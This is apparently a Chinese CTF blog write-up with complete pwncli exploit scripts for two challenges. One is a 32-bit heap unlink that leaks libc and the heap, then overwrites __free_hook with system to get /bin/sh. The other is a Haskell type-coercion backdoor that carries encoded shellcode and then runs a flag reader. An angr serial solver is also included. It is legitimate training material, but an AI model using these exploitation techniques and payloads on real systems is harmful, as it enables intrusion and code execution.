![image-20220403182540680](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403182540680.png)





## suctf_2019_old_pc

`32`位的`unlink`，做得有点不习惯。记录下`exp`：

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from re import M
from click import command
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

if gift.remote:
    libc: ELF = ELF("./libc-2.23.so")
    gift.libc = libc


def purchase(size, data="deadbeef"):
    sla(">>> ", "1")
    sla("Name length: ", str(size))
    sla("Name: ", data)
    sla("Price: ", "19971998")
    m = rls("Now Computer")
    log_ex(f"Get msg: {m}")
    return m

def comment(idx, comm):
    sla(">>> ", "2")
    sla("Index: ", str(idx))
    m = ru(" : ")
    log_ex(f"Get msg: {m}")
    s(comm)
    sla("And its score: ", "19971998")
    return m


def throw(idx):
    sla(">>> ", "3")
    sla("WHICH IS THE RUBBISH PC? Give me your index: ", str(idx))
    m = rls("Comment")
    log_ex(f"Get msg: {m}")
    return m


def rename(idx, name=None, addr=0):
    sla(">>> ", "4")
    sla("Give me an index: ", str(idx))
    if name:
        s(name)
        sla("Wanna get more power?(y/n)", "y")
        sla("Give me serial: ", "e4SyD1C!")
        sla("Hey Pwner\n", p32(addr))


purchase(0x8c)
purchase(0x8c)

throw(0)

comment(1, "a"*4)
m = throw(1)

if gift.debug:
    offset = 0x1b27b0
else:
    offset = 0x1b27b0-0x2000

libc_base = set_current_libc_base_and_log(u32_ex(m[0xc:0x10]), offset)


purchase(0x10) # 0
purchase(0x70) # 1
throw(0)

purchase(0xc) # 0
purchase(0xf8) # 2
purchase(0x10) # 3

throw(0)

purchase(0xc, b"a"*8+p32(0xa0)) # 0
throw(1)

# unlink
throw(2)

purchase(0xa0, flat({
    0x70: [
        0, 0x18,
        0, offset + libc_base,
        0, 0, 
        0, 0x11
    ]
})) # 1

m = comment(0, "comment")

heap_base = u32_ex(m[11:15]) - 0x230
log_heap_base_addr(heap_base)

throw(1)

purchase(0xa0, flat({
    0x70: [
        0, 0x18,
        0, heap_base+8,
        heap_base + 0xf0,
        libc.sym.__free_hook, "/bin/sh\x00"
    ]
})) # 1

rename(0, p32_ex(heap_base + 0xe8), libc.sym.system)

ia()
```



这里还借助了`angr`：

```python
import angr
import sys

base = 0x400000

#
proj = angr.Project("suctf_2019_old_pc.bk", auto_load_libs=False)
state = proj.factory.blank_state(addr=base+0x115d)
simu = proj.factory.simgr(state)

simu.explore(find=base+0x116A, avoid=base+0x11b9)

if simu.found:
    print("find!")
    solution = simu.found[0]
    key = solution.posix.dumps(sys.stdin.fileno())
    print(key)

```



![image-20220403214246955](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403214246955.png)



远程打：

![image-20220403214638459](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403214638459.png)

## [N1CTF 2019]TypeChecker

一脸懵逼的进去，一脸懵逼的出来。

参照着[这里](https://github.com/Nu1LCTF/n1ctf-2019/tree/master/PWN/typechecker)学习了一下`hacker`，学了就忘。

### EXP

```python3
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

ru("Please run the pow script with: ")
m = rl().split()

prestr = m[0].decode()
num = int_ex(m[1])

log_ex(f"prestr: {prestr}")
log_ex(f"num: {num}")

res = mbruteforce_hash_prefixstr(hash_algo="sha256", prefix_str=prestr, 
    check_res_func=lambda x: ('{0:0256b}'.format(int(x, 16))).endswith("0"*26), alphabet=string.ascii_letters, start_length=8, max_length=8)

print(res)

sla("and give me the result: ", str(int.from_bytes(res.encode(), "little")))

r()

s("""
{-# LANGUAGE OverloadedStrings, DataKinds, KindSignatures,
  ScopedTypeVariables #-}
{-# OPTIONS_GHC -O3 #-}
import GHC.Types.Backdoor

backdoor :: B1 1337 a -> B2 1337 b
backdoor = id

unsafeCoerce :: a -> b
unsafeCoerce x = unB2 (backdoor $ B1 x)

data Wrap a = Wrap { unwrap :: a }

readMem :: Int -> Int
readMem addr = unwrap (unsafeCoerce (addr - 7))

jmp :: Int -> ()
jmp addr = func (unwrap (unsafeCoerce addr)) `seq` ()

-- `seq` forces strictness on the first argument
-- ... or use BangPatterns for strictness
getAddr :: a -> Int
getAddr x = (y `seq` unsafeCoerce y) - 1
  where y = Wrap x

func :: [Int] -> Int
func [] = 0
func [x] = x
func (x:xs) = func xs

hard :: Int -> Int
hard 0 = 1
hard n =
  0x909090909090050f * hard (n - 16) +
  0xdeb90909090d231 * hard (n - 15) +
  0xdeb909090909058 * hard (n - 14) +
  0xdeb909090903b6a * hard (n - 13) +
  0xdeb909090df8948 * hard (n - 12) +
  0xdeb909090e68948 * hard (n - 11) +
  0xdeb909090909053 * hard (n - 10) +
  0xdeb90004a3e95bb * hard (n - 9) +
  0xdeb909090905441 * hard (n - 8) +
  0xdeb909090909053 * hard (n - 7) +
  0xdeb909090909050 * hard (n - 6) +
  0xdeb90909090c031 * hard (n - 5) +
  0xdeb90004a3e9fbb * hard (n - 4) +
  0xdeb909090e48949 * hard (n - 3) +
  0x6eb900000632d68 * hard (n - 2) 


shellcodeAddr :: Int
shellcodeAddr = 4220274

caddr :: Int
caddr = getAddr shellcodeAddr

cmdBuf :: String
cmdBuf = "/bin/sh"

strBuf :: String
strBuf = "/bin/bash"

main :: IO ()
main = do
  let x = caddr + 8       -- the address of the integer (which INTLIKE closure encloses)
  print (jmp x)
  y <- getLine
  print cmdBuf            -- ensure these two commands don't get optimized out
  print strBuf
  print $ hard $ read y   -- ensure 'hard' doesn't get optimized out
  return ()

END_OF_SNIPPET
"""
)

sleep(3)
sl("cd /")
sleep(2)
sl("./flag_reader")
sleep(2)
ru("Please enter '")
m = ru("'")
sl(m[:-1])

ia()
```

![image-20220403223543073](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403223543073.png)





# 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-03-08-buuctf-pwn-tasks-20/  

